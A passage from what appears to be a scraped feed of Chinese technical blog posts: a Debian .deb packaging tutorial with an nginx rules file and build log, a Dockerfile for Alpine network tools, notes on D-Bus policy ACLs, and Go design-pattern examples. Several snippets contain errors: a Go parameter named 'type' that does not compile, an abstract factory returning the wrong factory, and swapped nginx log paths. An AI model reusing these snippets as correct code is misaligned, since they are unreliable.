架构（architecture）无关的二进制包操作，所需的所有配置和编译操作。build 阶段应该依赖于这些阶段，或者采取与调用这些阶段相同的操作， build-arch 和 build-indep 不能执行任何可能需要 root 权限的操作。 通俗来讲，这两个阶段会被用于操作构建完的事情，对于rpmbuild，这里操作就是%files的操作了。 binary (required), binary-arch (required), binary-indep (required)： binary：该阶段必须是用户从此源代码包生成二进制包所需的全部内容。它分为两个部分：binary-arch用于生成特定架构的二进制包，binary-indep用于生成其他类型的二进制包 binary-* 阶段都应该依赖于 build 阶段或适当的 build-arch 或 build-indep 阶段，以便在没有构建该软件包时构建它。然后使用 dpkg-gencontrol 创建其控制文件以及dpkg-deb 构建成一个二进制包，并将它们放置在顶级目录的父目录中（即你执行构建的目录的上级），以创建相应的二进制包。 binary-arch 和 binary-indep 两个阶段必须要存在。如果其中一个阶段无事可做（如果源代码仅生成单个二进制包，无论是否架构相关，始终是如此），它仍必须存在并始终成功。 根据Rules-Requires-Root字段的值的配置，binary阶段可能需要作为root用户调用。 clean (required)：该阶段将撤消 build 和 binary 阶段可能产生的所有效果，除了它应该保留在上次运行 binary 阶段时在父目录中创建的任何输出文件。 patch (optional)：此阶段执行所需的任何其他操作，以使源代码包准备好进行编辑（解包其他上游归档文件、应用补丁等） 这些阶段执行构建的工作目录，与deb包的工作目录不同，他的工作目录为当前目录作为包的根目录来使用，有一点需要注意的是，这里的架构的觉得为 dpkg-architecture 命令决定的，在不同架构机器上构建则为不同的架构的包\n工作目录 在构建deb软件包（.deb文件）时，通常需要将软件包的文件和目录安排在特定的文件目录中，这个特定目录就是打包时的工作目录，通过上面的解释，已知，deb包分为两种 源代码包 和 二进制包，而两中类型的工作目录不相同。\n例如，我们需要构建一个源码软件包，假设为要为一个nginx制作 deb包，那么他的工作目录则为 debian，而control 文件 和 rule 文件则是必须的，封包的内容目录 则为控制文件中 Package 配置的名字，这里配置的为 nginx，那么这个deb包封包时寻找的内容则为 debian/nginx\n在例如，我们需要构建一个二进制软件包，那么他的工作目录为 DEBIAN，control文件与 changelog 则是必须的，而封包的内容目录 当前目录，也就是 DEBIAN，制作时的控制文件这些不会被封入包中\n那么完整的制作流程为：\n在源代码目录下创建一个名为nginx的子目录 mkdir debian 在nginx目录下创建名为 DEBIAN 的子目录，包含 control 文件，在DEBIAN目录中包含control文件是必须的，因为它是软件包元数据的中心存储库。 例如我们编译完的内容，nginx 的配置文件在 /etc/下，那么这个 etc 则在 nginx 子目录下 在工作目录下创建 rules 文件，这里面写明了构建的命令，例如： build：这个部分用于执行编译和构建软件的命令。 clean：这个部分用于清除编译输出，以便你可以重新构建软件包。 install：这个部分指定了如何将软件安装到目标系统中。 binary：这个部分用于在 Debian 软件包中打包二进制文件。 其中该结构中还包含一些钩子脚本文件 debian/p* 而这个 p* 文件的命名是固定的。下面是一些常见的 p* 文件名： debian/package.install：定义软件包中需要安装的文件和目录。 debian/package.manpages：将软件包中的 man 页面添加到 man 手册中。 debian/package.docs：将软件包中的文档添加到系统上的 /usr/share/doc 目录。 debian/package.preinst：在软件包安装前执行的脚本。 debian/package.postinst：在软件包安装后执行的脚本。 debian/package.prerm：在软件包卸载前执行的脚本。 debian/package.postrm：在软件包卸载后执行的脚本。 实战：从0构建一个 deb 包 准备条件 上面介绍的为deb包的一些基础，作为实战的一些理论知识，下面将以nginx为代表将其制作为deb包；通过前面知识了解到，deb包分为 源代码包 和 二进制包，那么nginx明显为源代码包，我们就需要按照 源代码包 =》二进制包 这种顺序依次定义，而 debian 提供了一系列的命令可以帮助生成这些文件，我们只需要改写具体的逻辑就可以完成包的制作，如 dh_make , dh_install 等命令。\n对于 deb 包的标准，debian 官方有一些列的教程，称为 Debian Policy Manual [4] ，可以通过这个手册，整个deb包中所需的一些理论知识，控制文件，维护脚本，包间的依赖关系，共享库等进行详细的说明\ndh工具 dh [6]（Debhelper）工具是Debian中自带的一个构建deb包的工具集。dh工具包含了一系列的脚本，用于从打包的源代码中自动化生成debian目录下的文件。这些脚本是 debian/rules 文件中的一部分，它们负责处理诸如构建、安装、打包、删除等任务。\ndh工具包括多个命令及其选项，更多的 dh 工具可以参考官方\n命令 说明 dh_make 创建一个基本的在deb包打包时的工作框架 dh_auto_configure 自动运行 configure 脚本以生成 Makefile dh_install 将文件复制到正确的deb包的构建目录中，一些常见选项：\n-s 或 --sourcedir=: 指定源代码目录；\n-X 或 --exclude: 排除在安装中不必要的文件；\n-n 或 --noscripts: 在安装软件包时不运行脚本；\n-Z: 表示安装的文件不要在规则中注册； dh_builddeb 以 .deb 文件格式构建软件包 dh_clean 清理debian目录和生成的文件，以确保它们不会在构建时对结果造成影响。 dh_gencontrol 生产和安装control文件 dh_installsystemd 安装systemd单元文件 dh_make dh_make 命令是一个用于快速创建 deb 包的命令行工具。它可以根据用户提供的基本信息和软件包源代码自动创建 deb 包的基础结构，包括 debian/ 目录和相关文件，如 control、rules 以及 changelog 等文件。DH 表示 Debian 包含 debhelper 建议的目录和文件结构。\n在默认情况下，dh_make 命令是交互式的，它会提示你输入一些必要的软件包信息，如软件包名称、版本号、作者、软件许可证等。如果你想非交互方式运行 dh_make 命令，并指定软件包信息，则可以使用 -s 选项。\n$ dh_make -s --createorig -f ../{some_package-1.2.3}.tar.gz -p {some_package_1.2.3-1}.deb 在上述命令中，-s 选项表示以非交互方式运行 dh_make 命令，并将软件包的基本信息作为参数指定。--createorig 选项表示我们想要创建一个原始的源代码包，-f 选项指定软件包源代码的文件名和路径，-p 选项指定要创建的 Debian 软件包的名称和版本号。\n而上述命令会提示输入一些基本的详细信息，以便在 debian/control 控制文件中为软件包设置元数据。dh_make 会询问输入软件包的名称、版本、描述、组件、维护人员等信息，是否以这些参数作为构建，如果不需要这部确认可以使用 -y 默认同意\n下面是通过 dh_make 构建出的在构建deb包的工作目录，这种方式下可以很明了的理解deb包的结构\n$ tree debian/ debian/ ├── changelog ├── control ├── copyright ├── manpage.1.ex ├── manpage.sgml.ex ├── manpage.xml.ex ├── nginx.cron.d.ex ├── nginx.doc-base.EX ├── nginx-docs.docs ├── postinst.ex ├── postrm.ex ├── preinst.ex ├── prerm.ex ├── README.Debian ├── README.source ├── rules ├── salsa-ci.yml.ex ├── source │ └── format └── watch.ex 到这里，我们就完成了一个源码包的前提条件的构建，只需要稍微修改控制文件即可，进行后续的二进制包的构建。\n这里最终的 控制文件 如下所示：\n# 源代码控制文件 Source: nginx Maintainer: root \u0026lt;root@debian-template\u0026gt; Section: comm Priority: optional Homepage: https://nginx.org # 二进制控制文件 Package: nginx-d Version: 1.22.1 Architecture: amd64 Standards-Version: 1.0.0 Build-Depends: debhelper-compat (= 13) Description: Nginx HTTP server Nginx (\u0026quot;engine x\u0026quot;) is a web server created by Igor Sysoev. It is known for its high performance, stability, and low resource consumption. 准备rules文件 通过上面的rules文件部分介绍，了解到 rules 文件就是一个 Makefile，并且包含三个阶段\nclean \u0026ndash; 删除所有build与binary阶段产生的内容\nbuild \u0026ndash; 编译与构建的步骤\nbinary \u0026ndash; binary阶段将创建deb包的root目录，这个目录被包含在 debian 目录下，而目录名则为 control 文件中配置的 Package 名字，即 debian/\u0026lt;source package name\u0026gt;\n这些阶段都通过 dpkg-buildpackage 在构建时被执行，一个rules文件的模板如下\n#!/usr/bin/make -f clean: @# Do nothing build: @# Do nothing binary: @# Do nothing dh_gencontrol dh_builddeb 那这个 nginx 的 rules 文件则为下述所示：\n#!/usr/bin/make -f # 列出您要編譯的檔案和目錄 export DH_VERBOSE=1 PACKAGE=nginx UPSTREAM_VERSION=1.22.1 # 設置打包的參數 export DEB_BUILD_MAINT_OPTIONS = hardening=+all export BUILDDIR_WORK = $(CURDIR)/debian/$(PACKAGE) export BUILDDIR=$(CURDIR)/debian/tmp # 定義建立目錄，它會在${CURDIR}/debian/$PACKAGE下創建 debian/$PACKAGE:: %: # build阶段，将完成软件的编译 build: tar zxf nginx-$(UPSTREAM_VERSION).tar.gz # 配置 Nginx 以使用必要的模塊和參數 cd nginx-$(UPSTREAM_VERSION) \u0026amp;\u0026amp; \\ ./configure \\ --conf-path=/etc/nginx/nginx.conf \\ --pid-path=/var/run/nginx \\ --sbin-path=/usr/sbin/nginx \\ --http-log-path=/var/log/nginx/error.log \\ --error-log-path=/var/log/nginx/access.log \\ --http-client-body-temp-path=/etc/nginx/ \\ --http-proxy-temp-path=/var/run/nginx/ \\ --http-fastcgi-temp-path=/var/run/nginx/ \\ --http-uwsgi-temp-path=/var/run/nginx/ \\ --http-scgi-temp-path=/var/run/nginx/ \\ --pid-path=/var/run/nginx/nginx.pid \\ --with-http_ssl_module \\ --without-http_gzip_module cd nginx-$(UPSTREAM_VERSION) \u0026amp;\u0026amp; make # 这里存在一个问题，即 prefix 与 DESTDIR 不要同时写，make install 被安装在哪里 # 如果配置了prefix 那么则被安装在 prefix/DESTDIR 变成了双重目录 # 这里不配置 prefix 只配置DESTDIR则会被安装在 deb 包在构建时的工作目录，这里制定了$(BUILDDIR) # 将被放置在 $(BUILDDIR) cd nginx-$(UPSTREAM_VERSION) \u0026amp;\u0026amp; make install DESTDIR=$(BUILDDIR) # 清理 rm -rf nginx-$(UPSTREAM_VERSION) clean: rm -rf nginx-$(UPSTREAM_VERSION) rm -rf $(BUILDDIR) rm -rf $(BUILDDIR_WORK) build-indep: # 构建前测试目录 dh_testdir build-arch: dh_testdir binary-indep: dh_testdir # 测试是否有root权限 dh_testroot # 在 binary 阶段中，执行的安装操作，创建 /etc/nginx目录 # 这些命令执行的是 install -d # 为什么使用 dh tool 而不用install，因为dh tool是rules file的一部分，也就是他默认的工作目录是 # 构建deb包的工作目录，这里必须是相对目录 # 而对于第一个的 \u0026quot;/\u0026quot; 与 最后一个 \u0026quot;/\u0026quot; 都不要写，会被自动除虫上 dh_installdirs etc/nginx dh_installdirs var/log/nginx dh_installdirs var/run/nginx dh_install etc/nginx/* etc/nginx dh_install usr/sbin/* usr/sbin # 这里创建了二进制包的目录结构 install -d $(BUILDDIR_WORK)/DEBIAN # dh_gencontrol可以根据源码包的配置来生成二进制包的control文件 # 底层封装的是 dh_gencontrol -O --file --package=nginx 为二进制包生成 dh_gencontrol -O --file --package=$(PACKAGE) # dh_installchangelogs 可以根据源码包中的changelog来生成二进制包的changelog # changelog 和 control file是二进制包必须的文件 # dh_gencontrol -O --file --package=nginx # 底层执行的为在 deb 包根目录的/usr/share/doc/nginx 中生成changelog # dh_installchangelogs # install -d debian/nginx/usr/share/doc/nginx # install -p -m0644 debian/changelog debian/nginx/usr/share/doc/nginx/changelog.Debian dh_installchangelogs # 这里将修复链接路径及压缩，如果你的一些软连接需要修复时可以使用 dh_compress binary: binary-indep # dh_builddeb命令将会构建一个二进制包 # dh_builddeb封装的时dpkg-deb命令 # dpkg-deb --build debian/nginx .. dh_builddeb .PHONY: clean binary-indep binary-arch binary install build 执行构建 通过执行 dpkg-buildpackage -b 来构建二进制源码包\ninstall -d debian/nginx/usr/sbin cp --reflink=auto -a debian/tmp/usr/sbin/nginx debian/nginx/usr/sbin/ install -d /root/nginx/debian/nginx/DEBIAN dh_gencontrol -O --file --package=nginx dpkg-gencontrol -pnginx -ldebian/changelog -Tdebian/nginx.substvars -Pdebian/nginx dpkg-gencontrol: warning: unknown information field 'Version' in input data in package's section of control info file dpkg-gencontrol: warning: unknown information field 'Standards-Version' in input data in package's section of control info file chmod 0644 -- debian/nginx/DEBIAN/control chown 0:0 -- debian/nginx/DEBIAN/control dh_installchangelogs install -d debian/nginx/usr/share/doc/nginx install -p -m0644 debian/changelog debian/nginx/usr/share/doc/nginx/changelog.Debian dh_compress cd debian/nginx chmod a-x usr/share/doc/nginx/changelog.Debian gzip -9nf usr/share/doc/nginx/changelog.Debian cd '/root/nginx' dh_builddeb dpkg-deb --build debian/nginx .. dpkg-deb: building package 'nginx' in '../nginx_1.22.1-1_amd64.deb'. dpkg-genbuildinfo --build=binary dpkg-genchanges --build=binary \u0026gt;../nginx_1.22.1-1_amd64.changes dpkg-genchanges: warning: unknown information field 'Version' in input data in package's section of control info file dpkg-genchanges: warning: unknown information field 'Standards-Version' in input data in package's section of control info file dpkg-genchanges: warning: unknown information field 'Build-Depends' in input data in package's section of control info file dpkg-genchanges: info: binary-only upload (no source code included) dpkg-source --after-build . dpkg-source: warning: unknown information field 'Version' in input data in package's section of control info file dpkg-source: warning: unknown information field 'Standards-Version' in input data in package's section of control info file dpkg-source: warning: unknown information field 'Build-Depends' in input data in package's section of control info file dpkg-buildpackage: info: binary-only upload (no source included) 构建完成后，生成的deb包在当前执行命令的父目录中，而生成的文件名遵守了 \u0026lt;name\u0026gt;_\u0026lt;version\u0026gt;-\u0026lt;revision\u0026gt;_\u0026lt;architecture\u0026gt;.deb 这种格式\n$ dpkg -c ../nginx_1.22.1-1_amd64.deb ./ ./etc/ ./etc/nginx/ ./etc/nginx/fastcgi.conf ./etc/nginx/fastcgi.conf.default ./etc/nginx/fastcgi_params ./etc/nginx/fastcgi_params.default ./etc/nginx/koi-utf ./etc/nginx/koi-win ./etc/nginx/mime.types ./etc/nginx/mime.types.default ./etc/nginx/nginx.conf ./etc/nginx/nginx.conf.default ./etc/nginx/scgi_params ./etc/nginx/scgi_params.default ./etc/nginx/uwsgi_params ./etc/nginx/uwsgi_params.default ./etc/nginx/win-utf ./usr/ ./usr/sbin/ ./usr/sbin/nginx ./usr/share/ ./usr/share/doc/ ./usr/share/doc/nginx/ ./usr/share/doc/nginx/changelog.Debian.gz ./var/ ./var/log/ ./var/log/nginx/ ./var/run/ ./var/run/nginx/ Troubleshooting no upstream tarball found dpkg-source: error: can't build with source format '3.0 (quilt)': no upstream tarball found at ../nginx_1.22.1.orig.tar.{bz2,gz,lzma,xz} dpkg-buildpackage: error: dpkg-source -b . subprocess returned exit status 2 解决：需要和你的构建目录 为上级即 debian 的上级\nnon-native package version does not contain a revision dpkg-source: error: can't build with source format '3.0 (quilt)': non-native package version does not contain a revision 解决：在changelog中定义正确的修订号\nDebian 软件包版本号由三个部分组成：Major.Minor.Revision，它们通常定义在软件包的 debian/changelog 文件中。\n在 debian/changelog 文件中，每个软件包版本都会记录下来，包括软件包的版本号、构建日期和构建者的姓名和电子邮件等信息，形成一个时间线。每个 Debian 软件包版本号应该遵循 X.Y.Z-r (或 X.Y.Z~rN) 的格式，其中 X.Y.Z 是软件包的版本号，r (或 N) 是软件包的修订号。\n用于版本号的changelog文件通常位于软件包源代码的 debian/ 目录中。您可以打开 debian/changelog 文件，找到最近的条目，将其中的版本号中的修订号修改为所需的值，并保存文件。在对 Debian 软件包进行重新打包之前，请确保更新了 debian/changelog 文件，以便反映新版本号的修改。\n需要注意的是，当您更改 debian/changelog 文件中的版本号时，请确保更新 debian/control 文件中的软件包版本依赖信息，以便与新的软件包版本号匹配。 这是为了确保软件包依赖关系与实际的软件包版本相匹配，避免在安装和使用软件包时出现问题。\nis not a valid version dpkg-genchanges: error: is not a valid version 解决：这个问题是因为制定了 -v 重写了 version 配置，而没有指定具体的版本号\n\u0026ldquo;yes\u0026rdquo; is invalid; use \u0026ldquo;binary-targets\u0026rdquo; instead dpkg-buildpackage: error: Rules-Requires-Root field keyword \u0026quot;yes\u0026quot; is invalid; use \u0026quot;binary-targets\u0026quot; instead 解决：control 文件的 Rules-Requires-Root 没有yes选项 [8]\nCompatibility levels before 5 are no longer supported (level 1 requested) dh: error: Compatibility levels before 5 are no longer supported (level 1 requested) 这个错误提示是由于 Debian Policy 从 3.9.0 开始不再支持 compat level 4 以及更低级别的设置，需要使用符合 Debian Policy 3.9.0 或更高版本的规范定义包。\n如果您在 debian/control 文件中设置了 compatibility level 较低的版本（如 3, 4），则会遇到这个错误。您需要将这个 compatibility level 提升至 5 或以上版本，即在 debian/control 文件中加入以下设置：\nunwanted binary file: debian/debian.deb dpkg-source: error: unwanted binary file: debian/debian.deb dpkg-source: error: detected 1 unwanted binary file (add it in debian/source/include-binaries to allow its inclusion). dpkg-buildpackage: error: dpkg-source -b . subprocess returned exit status 255 解决：删除上级目录中多余文件即可\ncannot represent change to .Xauthority: binary file contents changed dpkg-source: error: cannot represent change to .Xauthority: binary file contents changed dpkg-source: error: add .Xauthority in debian/source/include-binaries if you want to store the modified binary in the debian tarball dpkg-source: error: unrepresentable changes to source 解决：这是因为我直接在家目录操作的，家目录存在一些其他文件，如家目录下的隐藏文件\nReference [1] rules-requires-root\n[2] Control files and their fields\n[3] ar (Unix)\n[4] Debian Policy Manual\n[5] Main building script\n[6] debhelper(7)\n[7] Tutorial 2: building a binary package using dpkg-buildpackage\n[8] 5.6.31. Rules-Requires-Root\n","permalink":"https://www.oomkill.com/2023/03/deb-package/","summary":"","title":"Unix归档模式 Unix ar - 深入剖析与构建deb包"},{"content":" telnet：busybox-extras net-tools: net-tools tcpdump: tcpdump wget: wget dig nslookup: bind-tools curl: curl nmap: nmap wget ifconfig nc traceroute.. : busybox ssh: openssh-client ss iptables: iproute2 ethtool: ethtool FROM alpine MAINTAINER RUN sed -i 's@http://dl-cdn.alpinelinux.org/@https://mirrors.aliyun.com/@g' /etc/apk/repositories RUN apk add --no-cache --virtual .persistent-deps \\ curl \\ tcpdump \\ iproute2 \\ bind-tools \\ ethtool \\ busybox-extras \\ libressl \\ openssh-client \\ busybox CMD [ \u0026quot;tail\u0026quot;, \u0026quot;-f\u0026quot; ] ","permalink":"https://www.oomkill.com/2023/03/alpine-network-tools/","summary":"","title":"alpine安装网络工具"},{"content":"D-Bus 是 Linux 系统中的一种通信机制，用于在进程之间进行通信。D-Bus 配置文件则是一种用于配置 D-Bus 的文件，其中包含有关系统总线 (system bus)，会话总线 (session bus) 和各种系统服务的详细信息。\n本文将解析 D-Bus 配置文件，侧重点则为权限的配置\n配置文件的基本结构 D-Bus 配置文件使用 XML 格式进行编写，具有以下基本结构：\n\u0026lt;!DOCTYPE busconfig PUBLIC \u0026quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026quot; \u0026quot;http://www.freedesktop.org/standards/D-Bus/1.0/busconfig.dtd\u0026quot;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy group=\u0026quot;wheel\u0026quot;\u0026gt; \u0026lt;!-- policy rules go here --\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt; \u0026lt;!-- policy rules go here --\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;include filename=\u0026quot;other-config.xml\u0026quot;/\u0026gt; \u0026lt;listen\u0026gt;unix:path=/var/run/D-Bus/system_bus_socket\u0026lt;/listen\u0026gt; \u0026lt;/busconfig\u0026gt; 什么是D-Bus Policy？ D-Bus Policy是D-Bus配置文件中最重要的字段之一，用于定义D-Bus服务的访问控制策略。D-Bus Policy包含了一组规则，用于限制D-Bus服务的使用者对D-Bus服务的访问，确保D-Bus服务的安全性。\n这些规则可以限制对D-Bus的连接，以及对D-Bus服务的读写访问、接收和发送消息等操作，以助于保护D-Bus服务免受未经授权的访问和攻击。\nD-Bus Policy 是由 dbus-daemon 进程执行的，dbus-daemon 进程是DBus 消息总线系统的核心组件。D-Bus Policy 则在系统启动时加载并编译 dbus-policy 文件。此文件定义了系统中所有服务和对象的访问控制。\n配置D-Bus Policy \u0026lt;policy\u0026gt; 元素定义了要应用于总线连接的特定一组安全策略，也就是这里的核心配置， \u0026lt;policy\u0026gt; 段的主要的子配置包含两个 allow 与 deny\n例如，下面是一个D-Bus Policy配置文件的示例：\n\u0026lt;!DOCTYPE busconfig PUBLIC \u0026quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026quot; \u0026quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026quot;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy\u0026gt; \u0026lt;allow own=\u0026quot;org.example.myapp\u0026quot;/\u0026gt; \u0026lt;allow own=\u0026quot;org.example.myapp.service\u0026quot;/\u0026gt; \u0026lt;allow send_destination=\u0026quot;org.example.myapp.service\u0026quot;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt; 其中 own 用于允许其他DBus进程注册特定的DBus服务名称。own则是DBus服务的名称，它指明了DBus服务注册的名称，而这两条 own 允许了 org.example.myapp 和 org.example.myapp.service 的名字被注册。\n对于 own 存在四个回复标记\nRequestNameReplyPrimaryOwner: 表示名称请求成功，您已成为主要所有者。 RequestNameReplyInQueue: 表示名称请求被放置在名称队列中等待获取，因为另一个所有者正在使用该名称。请求没有立即成功，但您可以等待并在所有者释放名称所有权后获取名称所有权。 RequestNameReplyExists: 表示名称请求失败，因为该名称已被另一个所有者占用，不能再次被分配给您。 RequestNameReplyAlreadyOwner: 表示名称请求被拒绝，因为您已经是该名称的所有者。无需再次请求。 send_destination 指DBus进程发送消息的目的地DBus进程的名称，它指明了DBus进程消息通信的目标进程；而这条配置则表示 允许向 org.example.myapp.service 发送消息。这里 org.example.myapp.service 可以理解为是一个服务\npolicy的优先级 在dbus policy 不同的上下文属性具有不同的优先级，优先级从高到低为：\n“at_console” 属性的优先级最高，表示进程是否在控制台上运行。如果该属性为1，则表示进程在控制台上运行，否则表示不在控制台上。 其次是 “user” 属性，它用于指定DBus进程所属的用户账户。 最后是 “group” 属性，它用于指定DBus进程所属的用户组。 默认策略 系统总线 ( system bus ) 对于发送方法调用拥有的总 bus 默认策略为拒绝，对于接收消息、发送信号 (signal) 和为每个 没有 NO_REPLY 标志的方法调用发送单个成功或错误回复具有默认允许策略。不允许发送多个预期数量的回复。\n\u0026lt;policy\u0026gt; 包含四个属性，通常user, group 只系统的 id 可以看到的用户\ncontext：(default|mandatory) at_console：\u0026quot;(true|false)\u0026quot; user：\u0026ldquo;username or userid\u0026rdquo; group：\u0026ldquo;group name or gid\u0026rdquo; 权限配置 \u0026lt;deny\u0026gt; 配置需要出现在 \u0026lt;policy\u0026gt; 最上方，表示禁止某些操作，\u0026lt;allow\u0026gt; 是对上面的 \u0026lt;deny\u0026gt; 语句进行修饰。\n\u0026lt;deny\u0026gt; 确定是否拒绝与特定条件匹配的请求。如果匹配，则拒绝该操作（如果下面的 \u0026lt;allow\u0026gt; 允许，则允许），例如下列的配置\n\u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt; \u0026lt;deny receive_path=\u0026quot;/org/fedoraproject/FirewallD1\u0026quot; /\u0026gt; \u0026lt;allow user=\u0026quot;root\u0026quot; /\u0026gt; \u0026lt;allow own=\u0026quot;com.github.cylonchau.Uranus\u0026quot; /\u0026gt; \u0026lt;allow receive_sender=\u0026quot;com.github.cylonchau.Uranus\u0026quot; receive_path=\u0026quot;/org/fedoraproject/FirewallD1\u0026quot; /\u0026gt; \u0026lt;/policy\u0026gt; 例如拒绝所有请求 /org/fedoraproject/FirewallD1 的请求，只允许服务 com.github.cylonchau.Uranus 发送请求 /org/fedoraproject/FirewallD1 的请求\n具有一个或多个 send_* 系列属性的规则在连接尝试发送消息时按顺序检查。最后匹配消息的规则确定是否可以发送它。\n而通常，已知的会话总线允许发送任何消息。通常，已知的系统总线允许发送任何信号，选择性地向dbus-daemon发送方法调用，并恰好回答先前已发送的每个方法调用（成功或错误）。\n具有一个或多个 receive_* 系列属性或仅带有 eavesdrop 属性且没有其他属性的规则将为每个消息的 receiver 进行检查（如果消息是广播或连接正在窃听，则可能有多个接收者）。最后一个匹配消息的规则确定是否可以接收它。\nsend_destination 和 receive_sender 规则表示消息不能被发送到或从给定名称的 “所有者” （服务）接收，而不是不能向该名称发送。即，如果连接拥有服务A、B、C，并且向A发送被拒绝，则向B或C发送也将无法工作。作为特例，send_destination=\u0026quot;*\u0026quot; 匹配任何消息（无论是否指定了目标），而 receive_sender=\u0026quot;*\u0026quot; 匹配任何消息。\nReference dbus-daemon\n","permalink":"https://www.oomkill.com/2023/03/dbus-security-policy/","summary":"","title":"Linux Dbus中的ACL策略"},{"content":"创建型模式 工厂模式 概念说明 工厂模式 (factory pattern) 是在父类中提供一个创建对象的方法，是用于创建不同类型的对象，而无需指定对象的真实的类\n工厂模式的特点：\n对客户端隐藏对象创建的复杂逻辑 可以通过修改工厂类来创建对象而不影响客户端代码 提供创建对象的单一来源。 单个工厂类用以各组件保持一致性。 允许子类创建对象类型 图：工厂设计模式的示意图 Source：https://www.techcrashcourse.com/2015/10/factory-design-pattern.html\n图片说明： Owl, Eagle, Sparrow 类都必须实现 Brid 接口， 该接口声明了一个名为 fly() 的方法。 每个类都将以不同的方式实现该方法。而使用工厂模式后的代码机构则为图所示，当 Owl, Eagle, Sparrow 实现了共同的接口，就可以将其对象传递给客户代码， 而无需提供额外数据。\n而 “调用工厂方法的代码” 称为 “客户端代码”，这样可以做到 “不需要了解不同子类返回实际对象之间的差别”。客户端代码将所有 Brid Sanctuary 视为抽象的 Brid ，这样 ”客户端代码“ 知道所有鸟类对象都提供 fly() 方法， 但是并不关心其实现方式。\n代码实现 brid.go\npackage main type Brid interface { Fly() } Owl.go\ntype Owl struct {} func (g *Owl) Fly() { fmt.Println(\u0026quot;猫头鹰在飞\u0026quot;) } Eagle.go\ntype Eagle struct {} func (e *Eagle) Fly() { fmt.Println(\u0026quot;鹰在飞\u0026quot;) } Sparrow.go\ntype Sparrow struct {} func (e *Sparrow) Fly() { fmt.Println(\u0026quot;麻雀在飞\u0026quot;) } 创建一个工厂类 BridSanctuary.go\nfunc BridSanctuary(type string) Brid { if type == \u0026quot;Owl\u0026quot;{ return newOwl() } if type == \u0026quot;Eagle\u0026quot;{ return newEagle() } if type == \u0026quot;Sparrow\u0026quot;{ return newSparrow() } } 客户端使用时通过工厂类获得不同的对象\nsparrow := BridSanctuary(\u0026quot;sparrow\u0026quot;) eagle := BridSanctuary(\u0026quot;eagle\u0026quot;) 工厂模式特点\n客户端代码使用工厂模式提供的创建对象，而不是直接使用 new 运算符创建对象。 调用工厂对象并指定需要什么类型的对象。 工厂模式在不暴露对象创建的复杂逻辑的情况下可以创建各种对象。 工厂方法在将其类型转换为公共接口后，根据客户端代码的请求返回新创建的对象。 客户端通过 Interface 与对象进行交互，但并不知道具体类的类型 抽象工厂 概念说明 抽象工厂模式 (Abstract Factory)，是提供了一个 接口 或 抽象类创建一系列相关或依赖的对象，而不需要指定的具体类。抽象工厂模式，是工厂模式的超集，换句话说，抽象工厂是工厂的工厂，或者是工厂的wapper\n图：抽象工厂设计模式的示意图 Source：https://www.techcrashcourse.com/2015/10/abstract-factory-design-pattern.html\n代码实现 brid.go\ntype Brid interface { fly() } Owl.go\ntype Owl struct{} func (g *Owl) fly() { fmt.Println(\u0026quot;猫头鹰在飞\u0026quot;) } func newOwl() Brid { return \u0026amp;Owl{} } Eagle.go\ntype Eagle struct{} func (e *Eagle) fly() { fmt.Println(\u0026quot;鹰在飞\u0026quot;) } func newEagle() Brid { return \u0026amp;Eagle{} } Sparrow.go\ntype Sparrow struct{} func (e *Sparrow) fly() { fmt.Println(\u0026quot;麻雀在飞\u0026quot;) } func newSparrow() Brid { return \u0026amp;Sparrow{} } Animal.go\ntype Animal interface { run() } Horse.go\ntype Horse struct{} func (a *Horse) run() { fmt.Println(\u0026quot;马在跑\u0026quot;) } func newHorse() Animal { return \u0026amp;Horse{} } Lion.go\ntype Lion struct {} func (a *Lion) run() { fmt.Println(\u0026quot;狮子在跑\u0026quot;) } func newLion() Animal { return \u0026amp;Lion{} } 接下来创建 动物园的抽象工厂模式\ntype Zoo interface { GetBrid(t string) Brid GetAnimal(t string) Animal } // 抽象工厂的初始化 func FactoryCreator(t string) Zoo { if t == \u0026quot;EZooFactory\u0026quot; { return new(EZooFactory) } if t == \u0026quot;SZooFactory\u0026quot; { return new(EZooFactory) } return nil } 实现两个动物园，EZoo 和 SZoo\ntype EZooFactory struct{} func (e *EZooFactory) GetBrid(t string) Brid { if t == \u0026quot;Eagle\u0026quot; { return newEagle() } if t == \u0026quot;Sparrow\u0026quot; { return newSparrow() } return nil } func (c *EZooFactory) GetAnimal(t string) Animal { if t == \u0026quot;Lion\u0026quot; { return newLion() } return nil } SZoo\ntype SZooFactory struct{} func (e *SZooFactory) GetBrid(t string) Brid { if t == \u0026quot;Owl\u0026quot; { return newOwl() } return nil } func (c *SZooFactory) GetAnimal(t string) Animal { if t == \u0026quot;Horse\u0026quot; { return newHorse() } return nil } 客户端代码，通过creator可以定义了创建不同动物园的类，而每个动物园有其独特的动物。换句话来说，客户端代码通过抽象接口，将工厂模式与实体柔和为一体，使客户端创建出的工厂类可以是任何动物的变体\nfunc main() { e := FactoryCreator(\u0026quot;EZooFactory\u0026quot;) s := FactoryCreator(\u0026quot;SZooFactory\u0026quot;) e.GetBrid(\u0026quot;owl\u0026quot;) e.GetAnimal(\u0026quot;Horse\u0026quot;) } 抽象工厂模式的特点：\n抽象工厂设计模式目的是为了创建一系列相关的对象，从而不依赖具体的每一个子类 客户端代码并不知道使用了那个子类的工厂，首先工厂，然后调用具体方法获得具体的类 抽象工厂是工厂模式的超集 工厂模式与抽象工厂模式比较 Factory Method Abstract Factory 当包含一个工厂类时，只能产生一种类型的对象 包含一个工厂类时，能够产生一系列的多种不同类型的对象 工厂类通过create方法实现接口 使用interface为工厂创建抽象类 子类决定了返回什么样的对象 每一种专门的工厂用于创建一种类型的对象，因此也被称为 “factory of factories” 一个工厂产生一种对象 一个广义的工厂，包含一或多个工厂，每个工厂可产生一种类型的对象 建造者模式 建造者 (Builder) 是一种使用相同的代码逐步构建复杂对象的方式，\n假设一个复杂对象， 在对其进行构造时需要对诸多成员变量和嵌套对象进行繁琐的初始化工作。 这种场景的初始化代码通常是包含众多参数的构造函数中。例如，盖房子 House对象。 建造一栋简单的房屋， 首先需要建造四面墙和地板， 安装房门和一套窗户， 然后再建造一个屋顶。 但是如果想要一栋更大更明亮的房屋，还需要其他设施 